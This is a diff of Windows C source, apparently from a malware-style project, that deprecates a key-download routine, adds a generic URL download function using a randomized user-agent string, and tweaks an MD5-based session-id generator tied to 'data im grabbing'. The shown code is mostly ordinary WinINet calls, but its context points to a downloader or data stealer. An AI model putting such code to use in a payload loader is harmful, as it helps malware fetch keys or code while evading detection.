@@ -109,7 +109,6 @@ BOOL WriteFileCW(
 		DWORD dwT;
 		BOOL bT = WriteFile(hFile, pBuffer, nBuffer, &dwT, NULL);
 		CloseHandle(hFile);
-
 		return bT;
 	} else
 		return FALSE;
@@ -140,7 +139,7 @@ BOOL EExtractResource(
 }
 
 // Only Test rn but might be implemented further
-PVOID IDownloadKey() {
+DEPRECATED PVOID IDownloadKey() {
 	PCWSTR szAgent = EAllocRandomBase64StringW(NULL, 8, 16);
 	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
 	if (!hNet)
@@ -168,6 +167,35 @@ PVOID IDownloadKey() {
 
 	return pBuffer;
 }
+
+STATUS IDownloadFile(         // Reads Data from Url (Download File) / returns size read
+	_In_     PCWSTR  szUrl,   // Url to read from
+	_In_opt_ PTR     pOffset, // Offset to start reading from
+	_In_     PVOID   pBuffer, // Buffer to read to
+	_In_     SIZE_T  nSize    // count of Bytes to read (also Buffer size)
+) {
+	BOOL s = InternetCheckConnectionW(szUrl, NULL, NULL);
+	if (!s)
+		return -1;
+	PCWSTR szAgent = EAllocRandomBase64StringW(NULL, 8, 16);
+	HINTERNET hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
+	FreeMemory(szAgent);
+	if (!hNet)
+		return -2;
+	HINTERNET hUrl = InternetOpenUrlW(hNet, szUrl, NULL, 0, NULL, NULL);
+	if (!hUrl)
+		return -3;
+
+	SIZE_T nRead;
+	s = InternetReadFile(hUrl, pBuffer, nSize, &nRead);
+	BOOL sT = s;
+	s = InternetCloseHandle(hUrl);
+	s = InternetCloseHandle(hNet);
+	if (!sT)
+		return -4;
+	return nRead;
+}
+
 
 // so apperently every kind of data im grabbing is different
 // so fuck me in the ass, this is basically a session id now
@@ -204,7 +232,7 @@ VOID IGenerateSessionId(
 	}
 
 	// Finish Hashing
-	BCryptFinishHash(hh, pSId, MD5_SIZE, NULL);
+	BCryptFinishHash(hh, pSId, sizeof(MD5), NULL);
 	BCryptDestroyHash(hh);
 	BCryptCloseAlgorithmProvider(ah, NULL);
 }
